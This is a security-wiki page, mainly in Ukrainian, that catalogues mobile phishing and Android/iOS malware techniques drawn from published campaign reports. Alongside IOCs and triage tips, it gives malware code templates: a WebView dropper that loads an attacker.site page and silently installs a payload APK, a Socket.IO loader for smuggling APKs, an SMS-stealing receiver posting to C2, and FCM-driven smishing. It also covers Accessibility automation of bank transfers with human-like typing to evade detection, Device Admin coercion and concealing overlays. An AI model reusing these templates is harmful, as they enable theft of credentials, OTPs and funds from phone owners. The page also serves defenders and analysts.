# Мобільний фішинг і розповсюдження шкідливих додатків (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ця сторінка охоплює техніки, які використовують threat actors для розповсюдження **malicious Android APKs** та **iOS mobile-configuration profiles** через phishing (SEO, social engineering, fake stores, dating apps тощо).
> Матеріал адаптовано з кампанії SarangTrap, розкритої Zimperium zLabs (2025), та іншими публічними дослідженнями.

## Хід атаки

1. **Інфраструктура SEO/фішингу**
* Зареєструвати десятки схожих доменів (dating, cloud share, car service…).
– Використовувати ключові слова мовою цільової аудиторії та emojis в елементі `<title>`, щоб піднятися в Google.
– Розміщувати інструкції з встановлення для *обох* Android (`.apk`) та iOS на одній landing page.
2. **Початкове завантаження**
* Android: пряме посилання на *unsigned* або “third-party store” APK.
* iOS: `itms-services://` або звичайне HTTPS-посилання на шкідливий **mobileconfig** profile (див. нижче).
3. **Післяінсталяційна соціальна інженерія**
* Під час першого запуску додаток просить ввести **invitation / verification code** (ілюзія ексклюзивного доступу).
* Код **POST'иться по HTTP** на Command-and-Control (C2).
* C2 відповідає `{"success":true}` ➜ malware продовжує роботу.
* Sandbox / AV dynamic analysis, яке ніколи не надсилає валідний код, не бачить **шкідливої поведінки** (evade).
4. **Зловживання дозволами під час виконання** (Android)
* Небезпечні permissions запитуються лише **після позитивної відповіді C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Останні варіанти **видаляють `<uses-permission>` для SMS з `AndroidManifest.xml`**, але лишають Java/Kotlin code path, який читає SMS через reflection ⇒ знижує статичний бал, але лишається функціональним на пристроях, де permission надається через `AppOps` abuse або на старих цілях.

5. **Android 13+ Обмежені налаштування та обхід dropper (SecuriDropper‑style)**
* Android 13 ввів **Restricted settings** для sideloaded apps: перемикачі Accessibility та Notification Listener сірі, поки користувач явно не дозволить restricted settings в **App info**.
* Phishing-сторінки і droppers тепер дають покрокові UI інструкції, як **дозволити restricted settings** для sideloaded app, а потім увімкнути Accessibility/Notification access.
* Новіший обхід — встановити payload через **session‑based PackageInstaller flow** (той самий метод, що використовують app stores). Android сприймає додаток як встановлений зі store, тож Restricted settings більше не блокує Accessibility.
* Підказка для триажу: у dropper шукайте `PackageInstaller.createSession/openSession` та код, який одразу переводить користувача до `ACTION_ACCESSIBILITY_SETTINGS` або `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Фасадний UI та збір у фоновому режимі**
* Додаток показує нешкідливі view (SMS viewer, gallery picker), реалізовані локально.
* Тим часом він ексфільтрує:
- IMEI / IMSI, телефонний номер
- Повний дамп `ContactsContract` (JSON array)
- JPEG/PNG з `/sdcard/DCIM`, стиснуті за допомогою [Luban](https://github.com/Curzibn/Luban) щоб зменшити розмір
- Опційно вміст SMS (`content://sms`)
Payloads **batch‑zip'яться** і відправляються через `HTTP POST /upload.php`.
7. **Техніка доставки iOS**
* Один **mobile-configuration profile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб enroll пристрій у “MDM”-подібний supervision.
* Інструкції соціальної інженерії:
1. Відкрити Settings ➜ *Profile downloaded*.
2. Натиснути *Install* три рази (скриншоти на phishing-сторінці).
3. Довіритися unsigned profile ➜ attacker отримує *Contacts* & *Photo* entitlement без перевірки App Store.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads можуть **прикріпити phishing URL на Home Screen** з брендовою іконкою/лейблом.
* Web Clips можуть відкриватися **повноекранно** (ховає UI браузера) і бути позначені як **non‑removable**, змушуючи жертву видаляти profile, щоб прибрати іконку.
9. **Мережевий рівень**
* Plain HTTP, часто на порті 80 з HOST header на кшталт `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (немає TLS → легко виявити).

## Поради для Red Team

* **Bypass динамічного аналізу** – під час оцінки malware автоматизуйте фазу введення invitation code за допомогою Frida/Objection, щоб дістатися шкідливої гілки.
* **Різниця між Manifest і Runtime** – порівняйте `aapt dump permissions` з runtime `PackageManager#getRequestedPermissions()`; відсутність небезпечних perms — червоний прапорець.
* **Network Canary** – налаштуйте `iptables -p tcp --dport 80 -j NFQUEUE` щоб виявляти незвичні POST‑вики після введення коду.
* **Інспекція mobileconfig** – використовуйте `security cms -D -i profile.mobileconfig` на macOS, щоб перелічити `PayloadContent` і помітити надмірні entitlements.

## Корисний фрагмент Frida: Auto-Bypass Invitation Code

<details>
<summary>Frida: автоматичний обхід коду запрошення</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Індикатори (Загальні)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView платіжний phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Динамічне виявлення endpoint'ів через shortlink
- Malware отримує plain-text, comma-separated список живих endpoint'ів із shortlink; прості перетворення рядків формують остаточний шлях phishing page.

Приклад (санітизовано):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Псевдокод:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Крок “Make payment of ₹1 / UPI‑Lite” завантажує зловмисницьку HTML-форму з динамічного endpoint всередині WebView і захоплює конфіденційні поля (телефон, банк, UPI PIN), які `POST`яться до `addup.php`.

Мінімальний завантажувач:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Самопоширення та перехоплення SMS/OTP
- Під час першого запуску запитуються агресивні дозволи:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Контакти перебираються в циклі для масової відправки smishing SMS з пристрою жертви.
- Вхідні SMS перехоплюються broadcast receiver і завантажуються з метаданими (sender, body, SIM slot, per-device random ID) на `/addsm.php`.

Ескіз Receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) як стійкий C2
- payload реєструється в FCM; push-повідомлення містять поле `_type`, яке використовується як перемикач для запуску дій (наприклад, оновлення шаблонів тексту для phishing, перемикання поведінок).

Приклад payload для FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Ескіз обробника:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Індикатори/IOCs
- APK містить вторинний payload у `assets/app.apk`
- WebView завантажує payment з `gate.htm` та ексфільтрує на `/addup.php`
- Ексфільтрація SMS на `/addsm.php`
- Отримання конфігурації через shortlink (наприклад, `rebrand.ly/*`), що повертає CSV endpoints
- Додатки, позначені як загальні “Update/Secure Update”
- FCM `data` повідомлення з дискримінатором `_type` у ненадійних додатках

---

## Socket.IO/WebSocket-based APK Smuggling + Фейкові сторінки Google Play

Зловмисники все частіше замінюють статичні посилання на APK на канал Socket.IO/WebSocket, вбудований у приманки, що нагадують Google Play. Це приховує payload URL, дозволяє обходити фільтри URL/extension і зберігає реалістичний install UX.

Типовий клієнтський потік, зафіксований у реальних кампаніях:

<details>
<summary>Socket.IO фейковий завантажувач Play (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Чому це обходить прості засоби контролю:
- No static APK URL is exposed; payload реконструюється в пам'яті з WebSocket frames.
- URL/MIME/extension фільтри, що блокують прямі .apk відповіді, можуть пропустити двійкові дані, тунелювані через WebSockets/Socket.IO.
- Crawlers та URL sandboxes, які не виконують WebSockets, не отримають payload.

Див. також WebSocket tradecraft і tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay та Device Admin Abuse, ATS automation та NFC relay orchestration — кейс RatOn

Кампанія RatOn banker/RAT (ThreatFabric) є конкретним прикладом того, як сучасні мобільні phishing-операції поєднують WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover та навіть NFC-relay orchestration. Цей розділ узагальнює повторно використовувані техніки.

### Stage-1: WebView → native install bridge (dropper)
Зловмисники показують WebView, що вказує на сторінку зловмисника, і інжектять JavaScript interface, який відкриває native installer. Торкання HTML-кнопки викликає native код, який встановлює second-stage APK, упакований в assets дроппера, а потім одразу його запускає.

Мінімальний шаблон:

<details>
<summary>Stage-1 dropper мінімальний шаблон (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML на сторінці:
```html
<button onclick="bridge.installApk()">Install</button>
```
Після встановлення dropper запускає payload через явний package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ідея полювання: ненадійні додатки, що викликають `addJavascriptInterface()` і відкривають для WebView методи, схожі на інсталятор; APK доставляє вбудований вторинний payload у `assets/` і викликає Package Installer Session API.

### Воронка згоди: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 відкриває WebView, який містить сторінку «Access». Кнопка на ній викликає експортований метод, який переводить жертву в налаштування Accessibility і запитує увімкнення зловмисного сервісу. Після отримання дозволу malware використовує Accessibility, щоб автоматично натискати через наступні runtime-діалогові вікна дозволів (contacts, overlay, manage system settings тощо) і запитує Device Admin.

- Accessibility програмно допомагає приймати подальші підказки, знаходячи кнопки, такі як «Allow»/«OK», у дереві вузлів і відправляючи кліки.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Оператори можуть надсилати команди, щоб:
- відобразити full-screen overlay з URL, або
- передати inline HTML, яке завантажується у WebView overlay.

Можливі використання: примус (введення PIN), відкриття wallet для перехоплення PIN-ів, ransom messaging. Майте команду, яка перевіряє й запитує дозвіл на overlay, якщо його немає.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: періодично дампити Accessibility node tree, серіалізувати видимі тексти/roles/bounds і відправляти на C2 як pseudo-screen (команди на кшталт `txt_screen` одноразово і `screen_live` постійно).
- High-fidelity: запитувати MediaProjection і запускати screen-casting/запис за запитом (команди на кшталт `display` / `record`).

### ATS playbook (bank app automation)
Отримавши JSON-завдання, відкрити банківський додаток, керувати інтерфейсом через Accessibility за допомогою суміші текстових запитів і натискань за координатами, і вводити платіжний PIN жертви при запиті.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Нова оплата"
- "Zadat platbu" → "Ввести платіж"
- "Nový příjemce" → "Новий отримувач"
- "Domácí číslo účtu" → "Номер внутрішнього рахунку"
- "Další" → "Далі"
- "Odeslat" → "Відправити"
- "Ano, pokračovat" → "Так, продовжити"
- "Zaplatit" → "Оплатити"
- "Hotovo" → "Готово"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- Прострочити поточні облікові дані, щоб примусити зміну (Accessibility перехоплює новий PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Примусове розблокування без біометрії шляхом вимкнення біометричних функцій keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Примітка: Багато контролів DevicePolicyManager вимагають Device Owner/Profile Owner на сучасних Android; деякі OEM-збірки можуть бути менш строгими. Завжди перевіряйте на цільовій OS/OEM.

### Оркестрація NFC relay (NFSkate)
Stage-3 може встановити й запустити зовнішній NFC-relay модуль (наприклад, NFSkate) і навіть передати йому HTML-шаблон, щоб керувати жертвою під час реле. Це дозволяє здійснювати безконтактний card-present cash-out поряд із онлайн ATS.

Передісторія: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Набір команд оператора (приклад)
- UI/стан: `txt_screen`, `screen_live`, `display`, `record`
- Соціальні: `send_push`, `Facebook`, `WhatsApp`
- Оверлеї: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Гаманці: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Пристрій: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Комунікації/Розвідка: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Антидетекція ATS, керована Accessibility: людоподібна ритміка тексту та подвійне впровадження тексту (Herodotus)

Зловмисники все частіше поєднують автоматизацію, керовану Accessibility, з антидетекцією, настроєною проти базової поведінкової біометрії. Нещодавній banker/RAT демонструє два доповнювальні режими доставки тексту й перемикач оператора для імітації людського набору з рандомізованою ритмікою.

- Режим виявлення: перераховує видимі nodes за допомогою селекторів і bounds, щоб точно націлити поля введення (ID, text, contentDescription, hint, bounds) перед дією.
- Подвійне впровадження тексту:
  - Режим 1 – `ACTION_SET_TEXT` безпосередньо на цільовому node (стабільно, без клавіатури);
  - Режим 2 – встановлення clipboard + `ACTION_PASTE` у сфокусований node (працює, коли пряме setText заблоковано).
- Людоподібна ритміка: розбити рядок, наданий оператором, і вводити його по символу з випадковими затримками 300–3000 мс між подіями, щоб уникнути евристик «машинної швидкості набору». Реалізується або поступовим нарощуванням значення через `ACTION_SET_TEXT`, або вставлянням по одному символу.

<details>
<summary>Java sketch: виявлення node + затриманий по-символьний ввід через setText або clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Блокуючі overlay для прикриття шахрайства:
- Відобразити на весь екран `TYPE_ACCESSIBILITY_OVERLAY` з opacity, контрольованою оператором; тримати його непрозорим для жертви, поки під ним виконується віддалена автоматизація.
- Зазвичай доступні команди: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Мінімальний overlay з регульованою alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Часто зустрічаються примітиви керування оператором: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (спільний доступ до екрана).

## Посилання

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
